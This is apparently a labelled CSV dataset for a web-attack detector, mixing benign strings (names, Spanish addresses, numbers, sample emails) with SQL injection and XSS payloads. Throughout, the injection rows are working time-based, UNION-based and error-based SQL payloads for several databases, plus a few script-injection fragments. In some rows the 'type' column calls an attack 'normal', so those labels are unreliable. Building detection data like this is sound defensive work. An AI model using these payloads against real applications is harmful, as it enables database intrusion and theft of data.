Text,attack_type,Label,type
8444341614355746,norm,0,normal
natiuk,norm,0,normal
1') as hqaq where 6411=6411 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
cobo,norm,0,normal
44392621e,norm,0,normal
onomstico,norm,0,normal
puerto de bjar,norm,0,normal
-3422%') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',sqli,1,sql
"nuestra seora del perpetuo socorro, 125",norm,0,normal
"1' and elt(2266=7467,7467)",sqli,1,normal
9oc3976u9o,norm,0,normal
6411,norm,0,normal
"1%"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""%""=""",sqli,1,sql
confirm(2)>/,xss,2,normal
"1%'))) union all select null,null,null,null,null,null#",sqli,1,sql
napoli.scaccia@distritoeste.sv,norm,0,normal
6358756406474802,norm,0,normal
jeffries,norm,0,normal
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))-- nqdb",sqli,1,sql
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'aytf' like 'aytf",sqli,1,normal
antiseps$ia,norm,0,normal
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('sucj'='sucj",sqli,1,sql
"1"" or (select * from (select(sleep(5)))ydpu) and ""uvoq"" like ""uvoq",sqli,1,sql
<script>a=/xss/,xss,2,xss
"1')));select * from generate_series(7754,7754,case when (7754=1252) then 1 else 0 end) limit 1--",sqli,1,sql
1' and (select * from (select(sleep(5)))fzno) and 'gpax'='gpax,sqli,1,sql
rali,norm,0,normal
"1%' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and '%'='",sqli,1,sql
devota,norm,0,normal
c/ barja 187,norm,0,normal
jenner,norm,0,normal
lizalde-kikabidze@sorority.zr,norm,0,normal
"1'+(select 'opqr' where 2442=2442 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
47639,norm,0,normal
muduex,norm,0,normal
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",sqli,1,sql
15850392b,norm,0,normal
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",sqli,1,sql
"1') where 7640=7640 and make_set(8978=8594,8594)--",sqli,1,sql
4725,norm,0,normal
shannen,norm,0,normal
delfina,norm,0,normal
"-4571' union all select 3227,3227,3227,3227--",sqli,1,sql
"1 where 1992=1992 union all select null,null--",sqli,1,sql
8mp3n436lar,norm,0,normal
-3938%'))) or 2034=7209#,sqli,1,normal
henson_shah@eco-pro.cx,norm,0,normal
97lea0,norm,0,normal
"1"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""hmun""=""hmun",sqli,1,normal
zimmerly,norm,0,normal
8975421069079015,norm,0,normal
jabir,norm,0,normal
jazmn,norm,0,normal
cosburn,norm,0,normal
1 and sleep(5)# qcyj,sqli,1,normal
ballobar,norm,0,normal
"1%')) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1%"" and elt(4249=4249,7259) and ""%""=""",sqli,1,normal
33t40io4a563,norm,0,normal
felike,norm,0,normal
suzan,norm,0,normal
hau,norm,0,normal
"a=""get"";b=""url("""";c=""javascript:"";d=""alert('xss');"")"";eval(a+b+c+d);",xss,2,xss
"calle doctor jose manuel pascual y pascual 146, 4?c",norm,0,normal
c35iz3,norm,0,normal
13,norm,0,normal
sant quirze de besora,norm,0,normal
"1"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
frambueso,norm,0,normal
10294,norm,0,normal
"carrero boix, 112, 3?d",norm,0,normal
marge,norm,0,normal
tawnya3,norm,0,normal
"1')) and elt(4460=2665,2665) and (('qmzu'='qmzu",sqli,1,normal
10380,norm,0,normal
dalal,norm,0,normal
viriato,norm,0,normal
"1)) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((8475=8475",sqli,1,sql
"-2803"") union all select 5337,5337,5337,5337,5337,5337,5337#",sqli,1,sql
"entrada tamarit, 32,",norm,0,normal
"1"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""lano""=""lano",sqli,1,sql
quintilio,norm,0,normal
"-1272' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
08698,norm,0,normal
manferidor,norm,0,normal
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
tuffo,norm,0,normal
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",sqli,1,sql
rattanap,norm,0,normal
